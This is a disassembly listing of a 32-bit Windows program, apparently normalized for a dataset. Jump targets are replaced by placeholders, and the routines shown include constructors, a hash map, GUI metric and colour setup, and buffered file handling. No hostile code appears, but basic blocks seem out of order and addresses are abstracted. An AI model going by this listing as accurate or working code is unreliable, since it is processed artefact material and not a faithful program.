mov [ esi + 0x38 ] edi
mov [ esi + 0x3c ] edi
mov [ esi + 0x40 ] edi
mov [ esi + 0x44 ] edi
mov [ esi + 0x48 ] edi
mov [ esi + 0x4c ] edi
mov [ esi + 0x50 ] edi
mov [ esi + 0x54 ] edi
mov [ esi + 0x58 ] edi
mov [ esi + 0x5c ] edi
mov [ esi + 0x60 ] edi
mov eax esi
call sub_4102bc
retn
sub_407d4f
push 0xc
mov eax sub_420e56
call sub_410250
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ esi ] r--data
xor edi edi
mov [ esi + 0x1c ] edi
mov [ esi + 0x20 ] edi
lea ebx [ esi + 0x34 ]
mov ecx ebx
mov [ esi + 0x24 ] edi
mov [ esi + 0x28 ] edi
call sub_405c49
mov [ esi + 0x40 ] edi
mov [ esi + 0x44 ] edi
or [ esi + 0x50 ] 0xffffffff
mov [ ebp - 0x4 ] edi
mov [ esi + 0x54 ] edi
mov [ esi + 0x68 ] edi
mov [ esi + 0x6c ] edi
mov al [ ebp + 0x8 ]
push 0x1000
mov ecx ebx
mov [ esi + 0x28 ] 0x20
mov [ esi + 0x20 ] 0x14
mov [ esi + 0x18 ] edi
mov [ esi + 0x14 ] al
mov [ ebp - 0x4 ] 0x2
call sub_405c67
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] ebx
jmp sub_407dd9
sub_407dd9
push 0x8
mov [ esi + 0x30 ] ebx
mov [ esi + 0x44 ] 0x18
call sub_4053df
mov [ esi + 0x78 ] eax
mov [ esp ] 0x188
call sub_4072e4
mov ecx eax
mov [ ebp + 0x8 ] ecx
cmp ecx edi
mov [ ebp - 0x4 ] 0x4
je r-xdata
xor eax eax
call sub_407a8d
jmp r-xdata
xor eax eax
call sub_407cb1
jmp r-xdata
mov ecx [ esi + 0x78 ]
push 0x64
mov [ ebp - 0x4 ] bl
mov [ ecx ] eax
call sub_4072e4
mov ecx eax
mov [ ebp + 0x8 ] ecx
cmp ecx edi
mov [ ebp - 0x4 ] 0x5
je r-xdata
mov ecx [ esi + 0x78 ]
mov [ ecx + 0x4 ] eax
mov [ esi + 0x7c ] ebx
mov [ esi + 0x80 ] edi
mov eax esi
call sub_4102bc
retn 0x4
sub_407e7c
push 0x4
mov eax sub_420c69
call sub_41021d
push 0x84
call sub_4072e4
mov ecx eax
mov [ ebp - 0x10 ] ecx
xor eax eax
cmp ecx eax
mov [ ebp - 0x4 ] eax
je r-xdata
call sub_4102bc
retn
call sub_407e4d
sub_407eab
push sub_405503
mov ecx rw-data
call sub_4076fc
test eax eax
jne r-xdata
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
jmp sub_4054e9
retn
push sub_407e7c
mov ecx rw-data
call sub_407359
test eax eax
je r-xdata
sub_407ef7
push esi
mov esi ecx
call sub_407eab
cmp [ eax + 0x7c ] 0x0
je r-xdata
and [ esi + 0x4 ] 0x0
mov eax [ esp + 0x8 ]
mov eax [ eax + 0x80 ]
cmp eax 0xffffffff
je r-xdata
push esi
push eax
call sub_4077b7
mov [ esi + 0x4 ] eax
jmp r-xdata
mov eax esi
pop esi
retn 0x4
sub_407f2a
mov eax [ esp + 0x4 ]
mov ecx 0x10b
cmp eax ecx
ja r-xdata
sub eax 0x3e3
je r-xdata
je r-xdata
push 0xa
dec eax
je r-xdata
push 0x3
jmp r-xdata
cmp eax 0x3e
ja r-xdata
dec eax
je r-xdata
pop eax
cmp eax 0x6b
ja r-xdata
je r-xdata
dec eax
dec eax
je r-xdata
mov ecx 0x90
cmp eax ecx
ja r-xdata
je r-xdata
push 0x8
jmp r-xdata
cmp eax 0x19
ja r-xdata
push 0x5
jmp r-xdata
xor eax eax
inc eax
jmp r-xdata
mov ecx 0xb6
cmp eax ecx
ja r-xdata
je r-xdata
push 0x2
jmp r-xdata
cmp eax 0x47
ja r-xdata
cmp eax 0x27
ja r-xdata
je r-xdata
retn 0x4
sub eax 0xb7
je r-xdata
je r-xdata
cmp eax 0x75
ja r-xdata
sub eax 0x50
je r-xdata
je r-xdata
add eax 0xffffffcc
cmp eax 0x8
ja r-xdata
je r-xdata
push 0x9
jmp r-xdata
cmp eax 0x18
ja r-xdata
sub eax 0x8
je r-xdata
push 0x6
jmp r-xdata
sub eax 0x91
je r-xdata
sub eax 0x7b
je r-xdata
je r-xdata
dec eax
dec eax
je r-xdata
sub eax 0x40
je r-xdata
jmp [ eax * 4 + jump_table_40819a ]
push 0xd
jmp r-xdata
cmp eax 0x20
ja r-xdata
jmp [ eax * 4 + jump_table_408136 ]
dec eax
dec eax
je r-xdata
push 0x7
jmp r-xdata
sub eax 0x9
je r-xdata
dec eax
je r-xdata
sub eax 0x6c
je r-xdata
sub eax 0x3
je r-xdata
dec eax
je r-xdata
sub eax 0x21
je r-xdata
je r-xdata
xor eax eax
jmp r-xdata
push 0x4
jmp r-xdata
sub eax 0xd
je r-xdata
sub eax 0x7
je r-xdata
dec eax
je r-xdata
push 0xc
jmp r-xdata
sub eax 0x3
je r-xdata
dec eax
je r-xdata
dec eax
je r-xdata
dec eax
je r-xdata
push 0xb
jmp r-xdata
sub eax 0x1a
je r-xdata
jmp r-xdata
sub eax 0x6
je r-xdata
sub eax 0x6
je r-xdata
dec eax
je r-xdata
dec eax
dec eax
jne r-xdata
dec eax
je r-xdata
dec eax
dec eax
je r-xdata
dec eax
je r-xdata
dec eax
dec eax
jne r-xdata
sub eax 0x3
jne r-xdata
jmp r-xdata
dec eax
je r-xdata
dec eax
je r-xdata
dec eax
dec eax
jne r-xdata
dec eax
dec eax
je r-xdata
dec eax
jne r-xdata
dec eax
jne r-xdata
push 0xe
jmp r-xdata
sub_4081c4
push 0x4
mov eax sub_420e81
call sub_41021d
mov edi ecx
xor esi esi
cmp [ ebp + 0x8 ] esi
je r-xdata
xor eax eax
cmp [ ebp + 0xc ] esi
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax esi
mov ebx 0xf1a0
je r-xdata
call sub_4082df
push eax
lea ecx [ ebp - 0x10 ]
call sub_405b13
lea eax [ edi + 0x10 ]
push eax
lea ecx [ ebp + 0x10 ]
mov [ ebp - 0x4 ] esi
call sub_406a32
mov esi [ ebp + 0x10 ]
cmp [ esi - 0xc ] 0x0
mov [ ebp - 0x4 ] 0x1
jne r-xdata
mov ecx [ edi + 0x8 ]
add ecx ebx
mov [ eax ] ecx
mov eax [ edi + 0x8 ]
push esi
add eax ebx
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_408cb4
push 0xffffffff
push [ ebp - 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_405532
add esp 0x10
lea ecx [ esi - 0x10 ]
call sub_4056ce
mov ecx [ ebp - 0x10 ]
add ecx 0xfffffff0
call sub_4056ce
xor eax eax
inc eax
jmp r-xdata
push 0xf006
lea ecx [ ebp + 0x10 ]
call sub_405ea0
mov esi [ ebp + 0x10 ]
call sub_4102bc
retn 0xc
sub_408278
push 0x8
mov eax sub_420ea5
call sub_41021d
push 0x14
call sub_4053df
pop ecx
mov ecx eax
mov [ ebp - 0x14 ] ecx
xor eax eax
cmp ecx eax
mov [ ebp - 0x4 ] eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x10 ] eax
push r--data
lea eax [ ebp - 0x10 ]
push eax
call sub_40fe0c
int3
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_406200
sub_4082e5
push esi
mov esi [ esp + 0x8 ]
test esi esi
push edi
mov edi ecx
jge r-xdata
lea eax [ esi + 0x1 ]
imul eax [ esp + 0x10 ]
add eax 0x10
push eax
call sub_40f80e
test eax eax
pop ecx
je r-xdata
xor eax eax
jmp r-xdata
and [ eax + 0x4 ] 0x0
mov [ eax ] edi
mov [ eax + 0xc ] 0x1
mov [ eax + 0x8 ] esi
pop edi
pop esi
retn 0x8
sub_40832d
push esi
mov esi [ esp + 0xc ]
test esi esi
jge r-xdata
lea eax [ esi + 0x1 ]
imul eax [ esp + 0x10 ]
add eax 0x10
push eax
push [ esp + 0xc ]
call sub_40f8e7
test eax eax
pop ecx
pop ecx
je r-xdata
xor eax eax
jmp r-xdata
mov [ eax + 0x8 ] esi
pop esi
retn 0xc
sub_408390
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
call [ PathFindFileNameA@IAT ]
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_4054e9
push 0xffffffff
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_405532
add esp 0x10
xor eax eax
push eax
call [ lstrlenA@IAT ]
inc eax
jmp r-xdata
pop ebp
retn 0xc
sub_4083ce
push ebx
push esi
mov esi [ esp + 0xc ]
mov ebx ecx
mov eax [ ebx ]
push esi
call [ eax + 0x44 ]
test eax eax
jne r-xdata
pop esi
pop ebx
retn 0x4
mov eax [ ebx ]
push edi
mov ecx ebx
call [ eax + 0x38 ]
mov edi eax
mov eax [ esi ]
cmp [ r--data ] eax
jne r-xdata
mov edx [ edi + 0x4 ]
jmp r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ r--data ]
jne r-xdata
mov ecx [ edx ]
test ecx ecx
jne r-xdata
mov eax [ esi + 0x8 ]
cmp eax [ r--data ]
jne r-xdata
mov eax [ esi ]
cmp [ ecx ] eax
jne r-xdata
mov edi [ edi ]
test edi edi
jne r-xdata
mov eax [ esi + 0xc ]
cmp eax [ r--data ]
jne r-xdata
add edx 0x8
mov eax [ ecx + 0x4 ]
cmp eax [ esi + 0x4 ]
jne r-xdata
xor eax eax
mov ecx [ edi + 0x4 ]
xor edx edx
jmp r-xdata
mov eax [ ecx + 0x8 ]
cmp eax [ esi + 0x8 ]
jne r-xdata
cmp [ ecx ] edx
jne r-xdata
mov eax [ ecx + 0xc ]
cmp eax [ esi + 0xc ]
jne r-xdata
mov eax [ ecx + 0x4 ]
add eax ebx
cmp [ eax ] edx
jne r-xdata
mov edi [ edi ]
cmp edi edx
jne r-xdata
mov eax [ edx + 0x4 ]
add eax ebx
cmp [ eax ] 0x0
jne r-xdata
pop edi
add ecx 0x8
jmp r-xdata
sub_40847c
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ecx ]
push esi
push edi
mov [ ebp - 0x8 ] ecx
call [ eax + 0x38 ]
mov edi eax
cmp [ eax ] 0x0
jne r-xdata
add eax 0x8
lea esi [ eax + 0x4 ]
jmp r-xdata
cmp [ esi ] 0xffffffff
jne r-xdata
mov eax [ esi ]
mov ecx [ ebp - 0x8 ]
mov eax [ ecx + eax ]
test eax eax
je r-xdata
mov edi [ edi ]
test edi edi
jne r-xdata
add esi 0x8
mov ecx [ eax ]
and [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x4 ]
push edx
push [ ebp + 0x8 ]
push eax
call [ ecx ]
test eax eax
jne r-xdata
mov eax [ edi + 0x4 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
test eax eax
jne r-xdata
pop edi
pop esi
leave
retn 0x4
sub_40851f
push 0x8
mov eax sub_420f19
call sub_41021d
mov esi ecx
lea eax [ esi + 0x4 ]
cmp [ eax ] 0x0
jne r-xdata
push eax
call [ InterlockedDecrement@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
push [ esi + 0x1c ]
lea ecx [ ebp - 0x14 ]
call sub_407ef7
mov eax [ esi ]
and [ ebp - 0x4 ] ebx
mov ecx esi
call [ eax + 0x10 ]
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x10 ] ebx
je r-xdata
call sub_4102bc
retn
push [ ebp - 0x14 ]
push ebx
call sub_4077c7
sub_40858a
push esi
push edi
push [ esp + 0xc ]
mov edi ecx
call sub_4083ce
test eax eax
mov esi [ esp + 0x10 ]
mov [ esi ] eax
mov ecx edi
je r-xdata
push [ esp + 0xc ]
call sub_40847c
mov [ esi ] eax
neg eax
sbb eax eax
and eax 0x7fffbffe
add eax 0x80004002
call sub_408504
xor eax eax
jmp r-xdata
pop edi
pop esi
retn 0x8
sub_4085e8
push esi
push edi
mov edi [ GetSysColor@IAT ]
push 0xf
mov esi ecx
call edi
push 0x10
mov [ esi + 0x28 ] eax
call edi
push 0x14
mov [ esi + 0x2c ] eax
call edi
push 0x12
mov [ esi + 0x30 ] eax
call edi
push 0x6
mov [ esi + 0x34 ] eax
call edi
mov edi [ GetSysColorBrush@IAT ]
push 0xf
mov [ esi + 0x38 ] eax
call edi
push 0x6
mov [ esi + 0x24 ] eax
call edi
pop edi
mov [ esi + 0x20 ] eax
pop esi
retn
sub_40862c
push ebx
push esi
push edi
mov edi [ GetSystemMetrics@IAT ]
push 0xb
mov esi ecx
call edi
push 0xc
mov [ esi + 0x8 ] eax
call edi
push 0x2
mov [ esi + 0xc ] eax
call edi
inc eax
push 0x3
mov [ rw-data ] eax
call edi
inc eax
push 0x0
mov [ rw-data ] eax
call [ GetDC@IAT ]
mov ebx [ GetDeviceCaps@IAT ]
mov edi eax
push 0x58
push edi
call ebx
push 0x5a
push edi
mov [ esi + 0x18 ] eax
call ebx
push edi
push 0x0
mov [ esi + 0x1c ] eax
call [ ReleaseDC@IAT ]
pop edi
pop esi
pop ebx
retn
sub_408686
push ebx
push esi
push edi
mov esi ecx
call [ GetVersion@IAT ]
shr eax 0x1f
mov ecx esi
mov [ esi + 0x54 ] eax
call sub_40862c
xor ebx ebx
mov ecx esi
mov [ esi + 0x24 ] ebx
call sub_4085e8
mov edi [ LoadCursorA@IAT ]
push 0x7f02
push ebx
call edi
push 0x7f00
push ebx
mov [ esi + 0x3c ] eax
call edi
push 0x2
mov [ esi + 0x40 ] eax
pop eax
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] eax
pop edi
mov [ esi + 0x50 ] ebx
mov [ esi + 0x44 ] ebx
mov eax esi
pop esi
pop ebx
retn
sub_4086ff
push edi
mov edi [ esp + 0x8 ]
cmp edi 0x11
jb r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
call sub_4054e9
push ebx
mov ebx [ EnterCriticalSection@IAT ]
push ebp
push esi
lea esi [ edi * 4 + rw-data ]
cmp [ esi ] 0x0
mov ebp rw-data
jne r-xdata
call sub_4086db
imul edi edi 0x18
add edi ebp
push edi
call ebx
pop esi
pop ebp
pop ebx
pop edi
retn 0x4
push rw-data
call ebx
cmp [ esi ] 0x0
jne r-xdata
push rw-data
call [ LeaveCriticalSection@IAT ]
mov eax edi
imul eax eax 0x18
add eax ebp
push eax
call [ InitializeCriticalSection@IAT ]
inc [ esi ]
sub_408795
mov ecx [ esp + 0x8 ]
mov eax [ ecx + 0x4 ]
cmp eax 0x1
jne r-xdata
cmp eax 0xf
jne r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
push 0x0
push [ ecx ]
call [ ValidateRect@IAT ]
retn 0x8
sub_4087d0
push esi
push edi
mov edi [ esp + 0xc ]
test edi edi
mov esi ecx
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push 0x11
pop edi
cmp [ esp + 0x10 ] 0x0
je r-xdata
push eax
call j_sub_40f613
and [ esi + 0x4 ] 0x0
pop ecx
mov [ esi + 0x8 ] edi
pop edi
pop esi
retn 0x8
xor ecx ecx
push 0x4
pop edx
mov eax edi
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_4053df
mov ecx edi
shl ecx 0x2
push ecx
push 0x0
push eax
mov [ esi + 0x4 ] eax
call sub_4109d0
add esp 0x10
sub_40882a
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x14 ]
and [ esi + 0xc ] 0x0
and [ esi + 0x10 ] 0x0
call sub_40f03a
and [ esi + 0x14 ] 0x0
pop esi
retn
push eax
call j_sub_40f613
and [ esi + 0x4 ] 0x0
pop ecx
sub_40886e
mov edx [ esp + 0xc ]
push esi
mov esi [ esp + 0x8 ]
mov eax esi
shr eax 0x4
mov [ edx ] eax
xor edx edx
div [ ecx + 0x8 ]
mov eax [ esp + 0xc ]
mov [ eax ] edx
mov ecx [ ecx + 0x4 ]
test ecx ecx
je r-xdata
xor eax eax
mov eax [ ecx + edx * 4 ]
jmp r-xdata
test eax eax
jne r-xdata
cmp [ eax + 0x4 ] esi
je r-xdata
pop esi
retn 0xc
mov eax [ eax ]
sub_4088a6
test ecx ecx
jne r-xdata
push esi
mov esi [ ecx + 0x4 ]
test esi esi
jne r-xdata
call sub_4054e9
push edi
mov edi [ esp + 0xc ]
mov eax edi
xor edx edx
shr eax 0x4
div [ ecx + 0x8 ]
mov edx [ esi + edx * 4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
test edx edx
jne r-xdata
pop esi
retn 0x4
cmp [ edx + 0x4 ] edi
je r-xdata
xor eax eax
mov eax [ edx + 0x8 ]
jmp r-xdata
mov edx [ edx ]
pop edi
sub_4088e6
push esi
mov esi [ ecx + 0x4 ]
test esi esi
jne r-xdata
push edi
mov edi [ esp + 0xc ]
mov eax edi
shr eax 0x4
xor edx edx
div [ ecx + 0x8 ]
lea edx [ esi + edx * 4 ]
mov eax [ edx ]
jmp r-xdata
xor eax eax
jmp r-xdata
test eax eax
jne r-xdata
pop esi
retn 0x4
cmp [ eax + 0x4 ] edi
je r-xdata
pop edi
mov esi [ eax ]
push eax
mov [ edx ] esi
call sub_408855
xor eax eax
inc eax
jmp r-xdata
mov edx eax
mov eax [ eax ]
sub_408929
mov eax [ esp + 0x4 ]
push esi
mov esi [ eax ]
test esi esi
je r-xdata
pop esi
retn 0xc
cmp esi 0xffffffff
push edi
jne r-xdata
mov edi [ esi ]
test edi edi
jne r-xdata
mov edx [ ecx + 0x8 ]
xor edi edi
test edx edx
jbe r-xdata
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x10 ]
mov [ eax ] edi
mov eax [ esi + 0x4 ]
mov [ ecx ] eax
mov eax [ esi + 0x8 ]
mov ecx [ esp + 0x14 ]
mov [ ecx ] eax
pop edi
mov eax [ esi + 0x4 ]
shr eax 0x4
xor edx edx
push ebx
mov ebx [ ecx + 0x8 ]
div ebx
inc edx
cmp edx ebx
jae r-xdata
mov eax [ ecx + 0x4 ]
pop ebx
mov eax [ ecx + 0x4 ]
lea eax [ eax + edx * 4 ]
inc edi
add eax 0x4
cmp edi edx
jb r-xdata
inc edx
add eax 0x4
cmp edx ebx
jb r-xdata
mov esi [ eax ]
test esi esi
jne r-xdata
call sub_4054e9
mov edi [ eax ]
test edi edi
jne r-xdata
sub_4089aa
mov eax ecx
mov ecx [ esp + 0x4 ]
xor edx edx
cmp ecx edx
mov [ eax ] r--data
jg r-xdata
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] 0x11
mov [ eax + 0xc ] edx
mov [ eax + 0x10 ] edx
mov [ eax + 0x14 ] edx
mov [ eax + 0x18 ] ecx
retn 0x4
push 0xa
pop ecx
sub_4089e3
push esi
mov esi ecx
cmp [ esi + 0x10 ] 0x0
jne r-xdata
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
inc [ esi + 0xc ]
mov [ esi + 0x10 ] ecx
and [ eax + 0x4 ] 0x0
and [ eax + 0x8 ] 0x0
pop esi
retn
push 0xc
push [ esi + 0x18 ]
lea eax [ esi + 0x14 ]
push eax
call sub_40f009
mov ecx [ esi + 0x18 ]
mov edx ecx
imul edx edx 0xc
add eax 0x4
dec ecx
lea eax [ eax + edx - 0xc ]
js r-xdata
mov edx [ esi + 0x10 ]
mov [ eax ] edx
mov [ esi + 0x10 ] eax
dec ecx
sub eax 0xc
test ecx ecx
jge r-xdata
sub_408a31
push ebp
mov ebp esp
push ecx
push esi
push edi
mov edi [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp + 0x8 ]
push eax
push edi
mov esi ecx
call sub_40886e
test eax eax
jne r-xdata
pop edi
add eax 0x8
pop esi
leave
retn 0x4
cmp [ esi + 0x4 ] eax
jne r-xdata
mov ecx esi
call sub_4089e3
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x4 ] edi
mov edx [ esi + 0x4 ]
shl ecx 0x2
mov edx [ ecx + edx ]
mov [ eax ] edx
mov edx [ esi + 0x4 ]
mov [ ecx + edx ] eax
push 0x1
push [ esi + 0x8 ]
mov ecx esi
call sub_4087d0
sub_408aa8
push esi
mov esi ecx
mov ecx [ esi + 0x14 ]
push edi
xor edi edi
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0x4 ] edi
call sub_40f03a
mov [ esi + 0x14 ] edi
pop edi
pop esi
retn
sub_408aea
test ecx ecx
jne r-xdata
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
jmp sub_4054e9
mov edx [ eax ]
test edx edx
push esi
mov esi [ eax + 0x8 ]
mov [ ecx + 0x4 ] edx
je r-xdata
and [ ecx + 0x8 ] 0x0
and [ edx + 0x4 ] 0x0
jmp r-xdata
push eax
call sub_408ac8
mov eax esi
pop esi
retn
sub_408b1b
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0xc ]
test esi esi
push edi
jne r-xdata
mov ebx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
call sub_4054e9
and [ ebp + 0xc ] 0x0
cmp [ esi ] 0x0
mov edi esi
je r-xdata
push [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov ebx esi
call sub_405c67
cmp [ esi ] 0x0
mov edi eax
je r-xdata
mov cl [ edi ]
cmp cl 0x25
jne r-xdata
mov ecx [ ebp + 0x8 ]
sub edi [ ecx ]
push edi
call sub_405aee
pop edi
pop esi
pop ebx
leave
retn 0x10
mov cl [ ebx ]
cmp cl 0x25
jne r-xdata
movsx eax cl
push eax
call sub_4129b1
test eax eax
pop ecx
je r-xdata
mov al [ edi + 0x1 ]
cmp al 0x31
jl r-xdata
movsx eax cl
push eax
call sub_4129b1
test eax eax
pop ecx
je r-xdata
mov al [ ebx + 0x1 ]
cmp al 0x31
jl r-xdata
inc edi
inc [ ebp + 0xc ]
inc edi
cmp al 0x41
jl r-xdata
cmp al 0x39
jle r-xdata
mov al [ ebx ]
mov [ edi ] al
inc edi
inc ebx
mov al [ ebx ]
mov [ edi ] al
inc edi
inc ebx
dec [ ebp + 0xc ]
cmp al 0x41
jl r-xdata
cmp al 0x39
jle r-xdata
cmp al 0x5a
jg r-xdata
movsx eax al
sub eax 0x31
cmp al 0x5a
jg r-xdata
movsx eax al
sub eax 0x31
cmp al 0x39
jle r-xdata
inc [ ebp + 0xc ]
mov eax [ ebx + eax * 4 ]
test eax eax
je r-xdata
cmp al 0x39
jle r-xdata
mov ecx [ ebp + 0x10 ]
lea esi [ ecx + eax * 4 ]
mov eax [ esi ]
test eax eax
je r-xdata
mov [ edi ] 0x3f
inc edi
jmp r-xdata
movsx eax al
sub eax 0x38
jmp r-xdata
cmp [ edi ] 0x0
jne r-xdata
push eax
call [ lstrlenA@IAT ]
add [ ebp + 0xc ] eax
jmp r-xdata
movsx eax al
sub eax 0x38
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
push eax
call [ lstrlenA@IAT ]
push [ esi ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
inc eax
push eax
push edi
call sub_405628
mov eax [ ebp - 0x4 ]
sub [ ebp + 0xc ] eax
add esp 0xc
add edi eax
jmp r-xdata
dec [ ebp + 0xc ]
inc edi
inc edi
cmp eax [ ebp + 0x14 ]
jge r-xdata
inc ebx
inc ebx
cmp eax [ ebp + 0x14 ]
jl r-xdata
sub_408c5d
push 0x4
mov eax sub_420e13
call sub_41021d
call sub_4082df
push eax
lea ecx [ ebp - 0x10 ]
call sub_405b13
push [ ebp + 0xc ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x10 ]
call sub_405ea0
test eax eax
jne r-xdata
push [ ebp + 0x14 ]
mov esi [ ebp - 0x10 ]
push [ ebp + 0x10 ]
push esi
push [ ebp + 0x8 ]
call sub_408b1b
lea ecx [ esi - 0x10 ]
mov ecx [ ebp - 0x10 ]
add ecx 0xfffffff0
jmp r-xdata
call sub_4056ce
call sub_4102bc
retn 0x10
sub_408cf6
push ebp
mov ebp esp
push ecx
push ecx
push ebx
mov ebx [ ebp + 0xc ]
test ebx ebx
push esi
mov esi ecx
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
test [ esi + 0x18 ] 0x1
jne r-xdata
pop esi
pop ebx
leave
retn 0x8
mov eax [ esi + 0x28 ]
push edi
mov edi [ esi + 0x2c ]
sub edi eax
cmp ebx edi
jae r-xdata
push [ esi + 0x14 ]
push 0x4
call sub_4092e9
push edi
push eax
push ebx
push [ ebp + 0x8 ]
call sub_406d68
add [ esi + 0x28 ] edi
add [ ebp + 0x8 ] edi
add esp 0x10
sub ebx edi
je r-xdata
mov edi ebx
mov eax [ ebp + 0xc ]
sub eax ebx
pop edi
xor edx edx
mov eax ebx
div [ esi + 0x20 ]
mov edi ebx
sub edi edx
and [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] edi
sub ebx [ ebp - 0x8 ]
je r-xdata
cmp [ ebp - 0x4 ] 0x0
ja r-xdata
cmp [ ebp - 0x8 ] edi
jne r-xdata
push [ ebp - 0x4 ]
mov ecx [ esi + 0x24 ]
push [ ebp + 0x8 ]
mov eax [ ecx ]
call [ eax + 0x34 ]
add [ ebp + 0x8 ] eax
add [ ebp - 0x8 ] eax
sub [ ebp - 0x4 ] eax
test eax eax
jbe r-xdata
xor edi edi
cmp [ esi + 0x8 ] edi
jne r-xdata
mov ecx [ esi + 0x24 ]
mov edx [ ecx ]
lea eax [ esi + 0x2c ]
push eax
lea edi [ esi + 0x30 ]
push edi
push [ esi + 0x20 ]
push 0x0
call [ edx + 0x50 ]
mov eax [ edi ]
cmp [ esi + 0xc ] edi
jne r-xdata
push edi
push eax
push ebx
push [ ebp + 0x8 ]
call sub_406d68
add [ esi + 0x28 ] edi
add esp 0x10
sub ebx edi
mov edi ebx
mov [ ebp - 0x4 ] ebx
mov eax [ esi + 0x20 ]
cmp ebx eax
mov [ ebp - 0x4 ] eax
jbe r-xdata
mov eax [ esi + 0x30 ]
lea ecx [ eax + edi ]
mov [ esi + 0x2c ] ecx
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jbe r-xdata
mov eax [ esi + 0x30 ]
mov [ ebp - 0x8 ] eax
mov edi [ esi + 0x2c ]
sub edi eax
cmp ebx edi
mov [ esi + 0x28 ] eax
jae r-xdata
cmp edi ebx
jb r-xdata
push [ ebp - 0x4 ]
mov ecx [ esi + 0x24 ]
push [ ebp - 0x8 ]
mov eax [ ecx ]
call [ eax + 0x34 ]
add [ ebp - 0x8 ] eax
sub [ ebp - 0x4 ] eax
add edi eax
test eax eax
jbe r-xdata
sub_408e25
push esi
mov esi ecx
test [ esi + 0x18 ] 0x1
mov eax [ esi + 0x28 ]
push edi
je r-xdata
push ebx
xor ebx ebx
cmp [ esi + 0x8 ] ebx
lea edi [ esi + 0x30 ]
mov edx [ edi ]
jne r-xdata
mov edx [ esi + 0x2c ]
cmp edx eax
je r-xdata
cmp eax edx
je r-xdata
cmp eax edx
je r-xdata
mov eax [ esi + 0x2c ]
jmp r-xdata
mov ecx [ esi + 0x24 ]
mov edi [ ecx ]
sub eax edx
cdq
push 0x1
push edx
push eax
call [ edi + 0x28 ]
mov ecx [ esi + 0x24 ]
mov eax [ ecx ]
lea edx [ esi + 0x2c ]
push edx
push edi
push [ esi + 0x20 ]
push 0x1
call [ eax + 0x50 ]
mov ecx [ esi + 0x24 ]
push ebp
mov ebp [ ecx ]
push ebx
push ebx
sub eax edx
push eax
push 0x2
call [ ebp + 0x50 ]
pop ebp
mov eax [ edi ]
pop ebx
mov ecx [ esi + 0x24 ]
mov ebx [ ecx ]
sub eax edx
push eax
push edx
call [ ebx + 0x38 ]
jmp r-xdata
pop edi
mov [ esi + 0x28 ] eax
pop esi
retn
sub_408e9c
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
test [ esi + 0x18 ] 0x1
push edi
jne r-xdata
mov edx [ esi + 0x28 ]
mov eax [ ebp + 0x8 ]
lea ebx [ esi + 0x2c ]
mov ecx [ ebx ]
mov edi ecx
sub edi edx
add eax edi
cmp [ esi + 0x8 ] 0x0
mov [ ebp - 0x8 ] eax
jne r-xdata
push [ esi + 0x14 ]
push 0x4
test edi edi
je r-xdata
mov eax [ esi + 0x30 ]
cmp edx eax
jbe r-xdata
mov ecx [ esi + 0x24 ]
mov eax [ ecx ]
push ebx
lea edi [ esi + 0x30 ]
push edi
push [ esi + 0x20 ]
push 0x0
call [ eax + 0x50 ]
mov eax [ edi ]
mov [ esi + 0x28 ] eax
mov ecx [ esi + 0x24 ]
mov eax edi
neg eax
cdq
push 0x1
push edx
push eax
mov eax [ ecx ]
call [ eax + 0x28 ]
mov eax [ ebx ]
sub eax [ esi + 0x28 ]
pop edi
cmp eax [ ebp - 0x8 ]
pop esi
pop ebx
jae r-xdata
test edi edi
jle r-xdata
leave
retn 0x4
push 0x0
push 0x3
jmp r-xdata
cmp [ esi + 0xc ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] edi
jne r-xdata
push edi
push edx
sub ecx eax
push ecx
push eax
call sub_408cd7
mov eax [ esi + 0x30 ]
lea ecx [ eax + edi ]
add esp 0x10
mov [ esi + 0x28 ] eax
mov [ ebx ] ecx
call sub_4092e9
sub ecx edi
mov [ ebp + 0x8 ] ecx
add edi eax
mov ecx [ esi + 0x20 ]
mov eax [ esi + 0x30 ]
mov ecx [ ebp - 0x4 ]
